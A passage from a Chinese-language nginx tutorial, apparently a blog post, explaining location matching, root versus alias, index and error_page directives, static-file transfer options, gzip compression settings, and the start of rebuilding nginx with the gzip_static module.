class="code"><pre><code class="hljs awk">server &#123;<br>listen <span class="hljs-number">80</span>;<br>server_name <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;<br>location =/abc&#123;<br>default_type text/plain;<br>return <span class="hljs-number">200</span> <span class="hljs-string">&quot;access success&quot;</span>;<br>&#125;<br>&#125;<br>可以匹配到<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>/abc<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>/abc?p1=TOM<br>匹配不到<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span><span class="hljs-regexp">/abc/</span><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>/abcdef<br></code></pre></td></tr></table></figure><p>~ ： 用于表示当前uri中包含了正则表达式，并且区分大小写<br />~*:  用于表示当前uri中包含了正则表达式，并且不区分大小写</p><blockquote><p>同时使用的话，只匹配在.conf写在前面的一种</p></blockquote><p>换句话说，如果uri包含了正则表达式，需要用上述两个符合来标识</p><p>^~: 用于不包含正则表达式的uri前，功能和不加符号的一致，唯一不同的是，如果模式匹配，那么就停止搜索其他模式了。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39001</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <br>        <span class="hljs-section">location</span> <span class="hljs-regexp">~* ^/abc\w$</span> &#123;<br>           <span class="hljs-attribute">default_type</span> text/plain;<br>           <span class="hljs-attribute">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&quot;access success~*&quot;</span>;<br>       &#125;<br>       <br>            <br>        <span class="hljs-section">location</span> <span class="hljs-regexp">~ ^/abc\w$</span> &#123;<br>            <span class="hljs-attribute">default_type</span> text/plain;<br>            <span class="hljs-attribute">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&quot;access success~&quot;</span>;<br>        &#125;<br>            <br>        <br>       <br>        <span class="hljs-section">location</span><span class="hljs-regexp"> ^~</span> /abcd &#123;<br>            <span class="hljs-attribute">default_type</span> text/plain;<br>            <span class="hljs-attribute">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&quot;access success^~&quot;</span>;<br>            &#125;       <br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>还是有写在.conf文件中顺序的问题</p></blockquote><h4 id="设置请求资源的目录root-alias"><a class="markdownIt-Anchor" href="#设置请求资源的目录root-alias"></a> 设置请求资源的目录root / alias</h4><p>root：设置请求的根目录</p><table><thead><tr><th>语法</th><th>root path;</th></tr></thead><tbody><tr><td>默认值</td><td>root html;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>path为Nginx服务器接收到请求以后查找资源的根目录路径。</p><p>alias：用来更改location的URI</p><table><thead><tr><th>语法</th><th>alias path;</th></tr></thead><tbody><tr><td>默认值</td><td>—</td></tr><tr><td>位置</td><td>location</td></tr></tbody></table><p>path为修改后的根路径。</p><p>以上两个指令都可以来指定访问资源的路径，那么这两者之间的区别是什么?</p><p>举例说明：</p><p>（1）在<code>/usr/local/nginx/html</code>目录下创建一个 images目录,并在目录下放入一张图片<code>mv.png</code>图片</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">location /images &#123;<br>root <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>html;<br>&#125;<br></code></pre></td></tr></table></figure><p>访问图片的路径为:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span><span class="hljs-regexp">/images/m</span>v.png<br></code></pre></td></tr></table></figure><p>（2）如果把root改为alias</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">location /images &#123;<br>alias <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>html;<br>&#125;<br></code></pre></td></tr></table></figure><p>再次访问上述地址，页面会出现404的错误，查看错误日志会发现是因为地址不对，所以验证了：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">root的处理结果是: root路径+location路径（/images）<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>html+<span class="hljs-regexp">/images+/m</span>v.png（未匹配完的自动加上）<br>alias的处理结果是:使用alias路径替换location路径<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>html+/mv.png<br></code></pre></td></tr></table></figure><p>需要在alias后面路径改为</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">location /images &#123;<br>alias <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>html/images;<br>&#125;<br></code></pre></td></tr></table></figure><p>（3）如果location路径是以/结尾,则alias也必须是以/结尾，root没有要求</p><p>将上述配置修改为</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">location <span class="hljs-regexp">/images/</span> &#123;<br>alias <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>html/images; <br>&#125;<br></code></pre></td></tr></table></figure><p>访问就会出问题，查看错误日志还是路径不对，所以需要把alias后面加上 /</p><p>小结：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">root的处理结果是: root路径+<span class="hljs-keyword">location</span>路径<br><span class="hljs-keyword">alias</span>的处理结果是:使用<span class="hljs-keyword">alias</span>路径替换<span class="hljs-keyword">location</span>路径<br><span class="hljs-keyword">alias</span>是一个目录别名的定义，root则是最上层目录的含义。<br>如果<span class="hljs-keyword">location</span>路径是以/结尾,则<span class="hljs-keyword">alias</span>也必须是以/结尾，root没有要求<br></code></pre></td></tr></table></figure><h4 id="index指令"><a class="markdownIt-Anchor" href="#index指令"></a> index指令</h4><p>index:设置网站的默认首页</p><table><thead><tr><th>语法</th><th>index file …;</th></tr></thead><tbody><tr><td>默认值</td><td>index index.html;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>index后面可以跟多个设置，如果访问的时候没有指定具体访问的资源，则会依次进行查找，找到第一个为止。</p><p>举例说明：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">location</span> / &#123;<br>root /usr/<span class="hljs-keyword">local</span>/nginx/html;<br><span class="hljs-keyword">index</span> <span class="hljs-keyword">index</span>.html <span class="hljs-keyword">index</span>.htm;<br>&#125;<br>访问该<span class="hljs-keyword">location</span>的时候，可以通过 http://ip:port/，地址后面如果不添加任何内容，则默认依次访问<span class="hljs-keyword">index</span>.html和<span class="hljs-keyword">index</span>.htm，找到第一个来进行返回<br></code></pre></td></tr></table></figure><h4 id="error_page指令"><a class="markdownIt-Anchor" href="#error_page指令"></a> error_page指令</h4><p>error_page:设置网站的错误页面</p><table><thead><tr><th>语法</th><th>error_page code … [=[response]] uri;</th></tr></thead><tbody><tr><td>默认值</td><td>—</td></tr><tr><td>位置</td><td>http、server、location…</td></tr></tbody></table><p>当出现对应的响应code后，如何来处理。</p><p>举例说明：</p><p>（1）可以指定具体跳转的地址</p><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs roboconf">server &#123;<br><span class="hljs-attribute">error_page 404 http</span>://www<span class="hljs-variable">.itcast</span><span class="hljs-variable">.cn</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>（2）可以指定重定向地址</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf">server&#123;<br>error_page <span class="hljs-number">404</span> /<span class="hljs-number">50</span>x.html<span class="hljs-comment">;</span><br>error_page <span class="hljs-number">500</span> <span class="hljs-number">502</span> <span class="hljs-number">503</span> <span class="hljs-number">504</span> /<span class="hljs-number">50</span>x.html<span class="hljs-comment">;</span><br>location <span class="hljs-operator">=/</span><span class="hljs-number">50</span>x.html&#123;<br>root html<span class="hljs-comment">;</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>（3）使用location的@符合完成错误信息展示</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">server&#123;<br>error<span class="hljs-number">_p</span>age <span class="hljs-number">404</span> <span class="hljs-meta">@jump_to_error</span>;<br>location <span class="hljs-meta">@jump_to_error</span> &#123;<br><span class="hljs-keyword">default</span><span class="hljs-number">_</span>type text/plain;<br><span class="hljs-keyword">return</span> <span class="hljs-number">404</span> <span class="hljs-string">&#x27;Not Found Page...&#x27;</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可选项<code>=[response]</code>的作用是用来将相应代码更改为另外一个</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf">server&#123;<br>error_page <span class="hljs-number">404</span> <span class="hljs-operator">=</span><span class="hljs-number">200</span> /<span class="hljs-number">50</span>x.html<span class="hljs-comment">;</span><br>location <span class="hljs-operator">=/</span><span class="hljs-number">50</span>x.html&#123;<br>root html<span class="hljs-comment">;</span><br>&#125;<br>&#125;<br>这样的话，当返回<span class="hljs-number">404</span>找不到对应的资源的时候，在浏览器上可以看到，最终返回的状态码是<span class="hljs-number">200</span>，这块需要注意下，编写error_page后面的内容，<span class="hljs-number">404</span>后面需要加空格，<span class="hljs-number">200</span>前面不能加空格<br></code></pre></td></tr></table></figure><h3 id="静态资源优化配置语法"><a class="markdownIt-Anchor" href="#静态资源优化配置语法"></a> 静态资源优化配置语法</h3><p>Nginx对静态资源如何进行优化配置。这里从三个属性配置进行优化：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sendfile</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">tcp_nopush</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">tcp_nodeplay</span> <span class="hljs-literal">on</span>;<br></code></pre></td></tr></table></figure><p>（1）sendﬁle，用来开启高效的文件传输模式。</p><table><thead><tr><th>语法</th><th>sendﬁle on |oﬀ;</th></tr></thead><tbody><tr><td>默认值</td><td>sendﬁle oﬀ;</td></tr><tr><td>位置</td><td>http、server、location…</td></tr></tbody></table><p>请求静态资源的过程：客户端通过网络接口向服务端发送请求，操作系统将这些客户端的请求传递给服务器端应用程序，服务器端应用程序会处理这些请求，请求处理完成以后，操作系统还需要将处理得到的结果通过网络适配器传递回去。</p><p>如：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">server</span> &#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">80</span>;<br>server_name localhost；<br><span class="hljs-keyword">location</span> / &#123;<br>root html;<br><span class="hljs-keyword">index</span> <span class="hljs-keyword">index</span>.html;<br>&#125;<br>&#125;<br>在html目录下有一个welcome.html页面，访问地址<br>http://<span class="hljs-number">192.168</span><span class="hljs-number">.200</span><span class="hljs-number">.133</span>/welcome.html<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1587655397104.png" alt="1587655397104" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1587665814562.png" alt="1587665814562" /></p><p>（2）tcp_nopush：该指令必须在sendfile打开的状态下才会生效，主要是用来提升网络包的传输’效率’</p><table><thead><tr><th>语法</th><th>tcp_nopush on|off;</th></tr></thead><tbody><tr><td>默认值</td><td>tcp_nopush oﬀ;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>（3）tcp_nodelay：该指令必须在keep-alive连接开启的情况下才生效，来提高网络包传输的’实时性’</p><table><thead><tr><th>语法</th><th>tcp_nodelay on|off;</th></tr></thead><tbody><tr><td>默认值</td><td>tcp_nodelay on;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1587832596733.png" alt="1587832596733" /></p><p>经过刚才的分析，“tcp_nopush&quot;和”tcp_nodelay“看起来是&quot;互斥的”，那么为什么要将这两个值都打开，这个大家需要知道的是在linux2.5.9以后的版本中两者是可以兼容的，三个指令都开启的好处是，sendfile可以开启高效的文件传输模式，tcp_nopush开启可以确保在发送到客户端之前数据包已经充分“填满”， 这大大减少了网络开销，并加快了文件发送的速度。 然后，当它到达最后一个可能因为没有“填满”而暂停的数据包时，Nginx会忽略tcp_nopush参数， 然后，tcp_nodelay强制套接字发送数据。由此可知，TCP_NOPUSH可以与TCP_NODELAY一起设置，它比单独配置TCP_NODELAY具有更强的性能。所以我们可以使用如下配置来优化Nginx静态资源的处理</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sendfile</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">tcp_nopush</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">tcp_nodelay</span> <span class="hljs-literal">on</span>;<br></code></pre></td></tr></table></figure><h3 id="nginx静态资源压缩实战"><a class="markdownIt-Anchor" href="#nginx静态资源压缩实战"></a> Nginx静态资源压缩实战</h3><p>经过上述内容的优化，我们再次思考一个问题，假如在满足上述优化的前提下，我们传送一个1M的数据和一个10M的数据那个效率高?，答案显而易见，传输内容小，速度就会快。那么问题又来了，同样的内容，如果把大小降下来，我们脑袋里面要蹦出一个词就是&quot;压缩&quot;，接下来，我们来学习Nginx的静态资源压缩模块。</p><p>在Nginx的配置文件中可以通过配置gzip来对静态资源进行压缩，相关的指令可以配置在http块、server块和location块中，Nginx可以通过</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ngx<span class="hljs-emphasis">_http_gzip_module模块</span><br><span class="hljs-emphasis">ngx_http_gzip_static_module模块</span><br><span class="hljs-emphasis">ngx_http_gunzip_</span>module模块<br></code></pre></td></tr></table></figure><p>对这些指令进行解析和处理。</p><p>接下来我们从以下内容进行学习</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">（1）Gzip各模块支持的配置指令<br>（2）Gzip压缩功能的配置<br>（3）Gzip和sendfile的冲突解决<br>（4）浏览器不支持Gzip的解决方案<br></code></pre></td></tr></table></figure><h4 id="gzip模块配置指令"><a class="markdownIt-Anchor" href="#gzip模块配置指令"></a> Gzip模块配置指令</h4><p>接下来所学习的指令都来自ngx_http_gzip_module模块，该模块会在nginx安装的时候内置到nginx的安装环境中，也就是说我们可以直接使用这些指令。</p><ol><li>gzip指令：该指令用于开启或者关闭gzip功能</li></ol><table><thead><tr><th>语法</th><th>gzip on|off;</th></tr></thead><tbody><tr><td>默认值</td><td>gzip off;</td></tr><tr><td>位置</td><td>http、server、location…</td></tr></tbody></table><p>注意只有该指令为打开状态，下面的指令才有效果</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">http&#123;<br>   gzip on<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>gzip_types指令：该指令可以根据响应页的MIME类型选择性地开启Gzip压缩功能</li></ol><table><thead><tr><th>语法</th><th>gzip_types mime-type …;</th></tr></thead><tbody><tr><td>默认值</td><td>gzip_types text/html;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>所选择的值可以从mime.types文件中进行查找，也可以使用&quot;*&quot;代表所有。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">http&#123;<br>gzip_types application/javascript<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>gzip_comp_level指令：该指令用于设置Gzip压缩程度，级别从1-9,1表示要是程度最低，要是效率最高，9刚好相反，压缩程度最高，但是效率最低最费时间。</li></ol><table><thead><tr><th>语法</th><th>gzip_comp_level level;</th></tr></thead><tbody><tr><td>默认值</td><td>gzip_comp_level 1;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">http&#123;<br>gzip_comp_level <span class="hljs-number">6</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="4"><li>gzip_vary指令：该指令用于设置使用Gzip进行压缩发送是否携带“Vary:Accept-Encoding”头域的响应头部。主要是告诉接收方，所发送的数据经过了Gzip压缩处理</li></ol><table><thead><tr><th>语法</th><th>gzip_vary on|off;</th></tr></thead><tbody><tr><td>默认值</td><td>gzip_vary off;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1587361606028.png" alt="1587361606028" /></p><ol start="5"><li>gzip_buffers指令：该指令用于处理请求压缩的缓冲区数量和大小。</li></ol><table><thead><tr><th>语法</th><th>gzip_buffers number size;</th></tr></thead><tbody><tr><td>默认值</td><td>gzip_buffers 32 4k|16 8k;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>其中number:指定Nginx服务器向系统申请缓存空间个数，size指的是每个缓存空间的大小。主要实现的是申请number个每个大小为size的内存空间。这个值的设定一般会和服务器的操作系统有关，所以建议此项不设置，使用默认值即可。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gzip_buffers</span> <span class="hljs-number">4</span> <span class="hljs-number">16</span>K;  #缓存空间大小<br></code></pre></td></tr></table></figure><ol start="6"><li>gzip_disable指令：针对不同种类客户端发起的请求，可以选择性地开启和关闭Gzip功能。</li></ol><table><thead><tr><th>语法</th><th>gzip_disable regex …;</th></tr></thead><tbody><tr><td>默认值</td><td>—</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>regex:根据客户端的浏览器标志(user-agent)来设置，支持使用正则表达式。指定的浏览器标志不使用Gzip.该指令一般是用来排除一些明显不支持Gzip的浏览器。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">gzip_disable <span class="hljs-string">&quot;MSIE [1-6]\.&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><ol start="7"><li>gzip_http_version指令：针对不同的HTTP协议版本，可以选择性地开启和关闭Gzip功能。</li></ol><table><thead><tr><th>语法</th><th>gzip_http_version 1.0|1.1;</th></tr></thead><tbody><tr><td>默认值</td><td>gzip_http_version 1.1;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>该指令是指定使用Gzip的HTTP最低版本，该指令一般采用默认值即可。</p><ol start="8"><li>gzip_min_length指令：该指令针对传输数据的大小，可以选择性地开启和关闭Gzip功能</li></ol><table><thead><tr><th>语法</th><th>gzip_min_length length;</th></tr></thead><tbody><tr><td>默认值</td><td>gzip_min_length 20;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">nignx计量大小的单位：bytes[字节] <span class="hljs-regexp">/ kb[千字节] /</span> M[兆]<br>例如: <span class="hljs-number">1024</span> <span class="hljs-regexp">/ 10k|K /</span> <span class="hljs-number">10</span>m|M<br></code></pre></td></tr></table></figure><p>Gzip压缩功能对大数据的压缩效果明显，但是如果要压缩的数据比较小的化，可能出现越压缩数据量越大的情况，因此我们需要根据响应内容的大小来决定是否使用Gzip功能，响应页面的大小可以通过头信息中的<code>Content-Length</code>来获取。但是如何使用了Chunk编码动态压缩，该指令将被忽略。建议设置为1K或以上。</p><ol start="9"><li>gzip_proxied指令：该指令设置是否对服务端返回的结果进行Gzip压缩。</li></ol><table><thead><tr><th>语法</th><th>gzip_proxied  off|expired|no-cache|<br/>no-store|private|no_last_modified|no_etag|auth|any;</th></tr></thead><tbody><tr><td>默认值</td><td>gzip_proxied off;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>off - 关闭Nginx服务器对后台服务器返回结果的Gzip压缩<br />expired - 启用压缩，如果header头中包含 “Expires” 头信息<br />no-cache - 启用压缩，如果header头中包含 “Cache-Control:no-cache” 头信息<br />no-store - 启用压缩，如果header头中包含 “Cache-Control:no-store” 头信息<br />private - 启用压缩，如果header头中包含 “Cache-Control:private” 头信息<br />no_last_modified - 启用压缩,如果header头中不包含 “Last-Modified” 头信息<br />no_etag - 启用压缩 ,如果header头中不包含 “ETag” 头信息<br />auth - 启用压缩 , 如果header头中包含 “Authorization” 头信息<br />any - 无条件启用压缩</p><h4 id="gzip压缩功能的实例配置"><a class="markdownIt-Anchor" href="#gzip压缩功能的实例配置"></a> Gzip压缩功能的实例配置</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">gzip</span> <span class="hljs-literal">on</span>;    <span class="hljs-comment">#开启gzip功能</span><br><span class="hljs-attribute">gzip_types</span> *;  <span class="hljs-comment">#压缩源文件类型,根据具体的访问资源类型设定</span><br><span class="hljs-attribute">gzip_comp_level</span> <span class="hljs-number">6</span>;  <span class="hljs-comment">#gzip压缩级别</span><br><span class="hljs-attribute">gzip_min_length</span> <span class="hljs-number">1024</span>; <span class="hljs-comment">#进行压缩响应页面的最小长度,content-length</span><br><span class="hljs-attribute">gzip_buffers</span> <span class="hljs-number">4</span> <span class="hljs-number">16K</span>;  <span class="hljs-comment">#缓存空间大小</span><br><span class="hljs-attribute">gzip_http_version</span> <span class="hljs-number">1</span>.<span class="hljs-number">1</span>; <span class="hljs-comment">#指定压缩响应所需要的最低HTTP请求版本</span><br><span class="hljs-attribute">gzip_vary</span>  <span class="hljs-literal">on</span>;  <span class="hljs-comment">#往头信息中添加压缩标识</span><br><span class="hljs-attribute">gzip_disable</span> <span class="hljs-string">&quot;MSIE [1-6]\.&quot;</span>; <span class="hljs-comment">#对IE6以下的版本都不进行压缩</span><br><span class="hljs-attribute">gzip_proxied</span>  <span class="hljs-literal">off</span>； <span class="hljs-comment">#nginx作为反向代理压缩服务端返回数据的条件</span><br></code></pre></td></tr></table></figure><p>这些配置在很多地方可能都会用到，所以我们可以将这些内容抽取到一个配置文件中，然后通过include指令把配置文件再次加载到nginx.conf配置文件中，方法使用。</p><p>nginx_gzip.conf</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">gzip</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">gzip_types</span> *;<br><span class="hljs-attribute">gzip_comp_level</span> <span class="hljs-number">6</span>;<br><span class="hljs-attribute">gzip_min_length</span> <span class="hljs-number">1024</span>;<br><span class="hljs-attribute">gzip_buffers</span> <span class="hljs-number">4</span> <span class="hljs-number">16K</span>;<br><span class="hljs-attribute">gzip_http_version</span> <span class="hljs-number">1</span>.<span class="hljs-number">1</span>;<br><span class="hljs-attribute">gzip_vary</span>  <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">gzip_disable</span> <span class="hljs-string">&quot;MSIE [1-6]\.&quot;</span>;<br><span class="hljs-attribute">gzip_proxied</span>  <span class="hljs-literal">off</span>;<br></code></pre></td></tr></table></figure><p>nginx.conf</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">include</span> nginx_gzip.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure><h4 id="gzip和sendfile共存问题"><a class="markdownIt-Anchor" href="#gzip和sendfile共存问题"></a> Gzip和sendfile共存问题</h4><p>前面在讲解sendfile的时候，提到过，开启sendfile以后，在读取磁盘上的静态资源文件的时候，可以减少拷贝的次数，可以不经过用户进程将静态文件通过网络设备发送出去，但是Gzip要想对资源压缩，是需要经过用户进程进行操作的。所以如何解决两个设置的共存问题。</p><p>可以使用ngx_http_gzip_static_module模块的gzip_static指令来解决。</p><h5 id="gzip_static指令"><a class="markdownIt-Anchor" href="#gzip_static指令"></a> gzip_static指令</h5><p>gzip_static: 检查与访问资源同名的.gz文件时，response中以gzip相关的header返回.gz文件的内容。</p><table><thead><tr><th>语法</th><th><strong>gzip_static</strong> on | off | always;</th></tr></thead><tbody><tr><td>默认值</td><td>gzip_static off;</td></tr><tr><td>位置</td><td>http、server、location</td></tr></tbody></table><p>添加上述命令后，会报一个错误，<code>unknown directive &quot;gzip_static&quot;</code>主要的原因是Nginx默认是没有添加ngx_http_gzip_static_module模块。如何来添加?</p><h5 id="添加模块到nginx的实现步骤"><a class="markdownIt-Anchor" href="#添加模块到nginx的实现步骤"></a> 添加模块到Nginx的实现步骤</h5><p>(1)查询当前Nginx的配置参数</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nginx -V</span><br></code></pre></td></tr></table></figure><p>(2)将nginx安装目录下sbin目录中的nginx二进制文件进行更名</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin<br>mv nginx nginxold<br></code></pre></td></tr></table></figure><p>(3) 进入Nginx的安装目录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/root/</span>nginx<span class="hljs-regexp">/core/</span>nginx-<span class="hljs-number">1.16</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>(4)执行make clean清空之前编译的内容</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make clean</span><br></code></pre></td></tr></table></figure><p>(5)使用configure来配置参数</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./configure</span> <span class="hljs-params">--with-http_gzip_static_module</span><br></code></pre></td></tr></table></figure><p>(6)使用make命令进行编译</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make</span><br></code></pre></td></tr></table></figure><p>(7) 将objs目录下的nginx二进制执行文件移动到nginx安装目录下的sbin目录中</p><figure class="highlight awk"><table><tr><td 